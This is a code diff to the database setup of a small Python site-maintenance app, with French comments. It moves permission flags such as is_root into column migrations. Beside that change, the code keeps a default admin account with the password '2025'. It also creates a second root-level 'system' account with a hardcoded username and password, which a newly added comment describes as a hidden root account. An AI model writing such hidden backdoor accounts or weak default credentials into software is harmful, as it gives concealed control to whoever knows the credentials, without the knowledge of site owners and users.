@@ -18,24 +18,38 @@ DB_PATH = os.path.join(os.path.dirname(__file__), 'site-maintenance.db')
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
+    # Crée la table si elle n'existe pas (4 colonnes de base)
     c.execute('''
         CREATE TABLE IF NOT EXISTS comptes (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             username TEXT UNIQUE,
             password TEXT,
-            role TEXT,
-            can_edit_name INTEGER DEFAULT 0,
-            can_edit_date INTEGER DEFAULT 0,
-            is_root INTEGER DEFAULT 0,
-            is_system INTEGER DEFAULT 0
+            role TEXT
         )
     ''')
+    # Ajoute les colonnes si elles n'existent pas déjà
+    colonnes = [
+        "can_edit_name INTEGER DEFAULT 0",
+        "can_edit_date INTEGER DEFAULT 0",
+        "is_root INTEGER DEFAULT 0",
+        "is_system INTEGER DEFAULT 0"
+    ]
+    for col in colonnes:
+        nom_colonne = col.split()[0]
+        try:
+            c.execute(f"ALTER TABLE comptes ADD COLUMN {col}")
+        except sqlite3.OperationalError:
+            pass  # La colonne existe déjà, on ignore
+
+    # Admin standard (toujours présent)
     c.execute("INSERT OR IGNORE INTO comptes (username, password, role) VALUES (?, ?, ?)",
               ('admin', generate_password_hash('2025'), 'admin'))
+    # Compte root caché, système
     c.execute("INSERT OR IGNORE INTO comptes (username, password, role, is_root, is_system) VALUES (?, ?, ?, 1, 1)",
               ('letigredu33', generate_password_hash('LeTigre@@1968'), 'root'))
     conn.commit()
     conn.close()
+
 
 init_db()
 
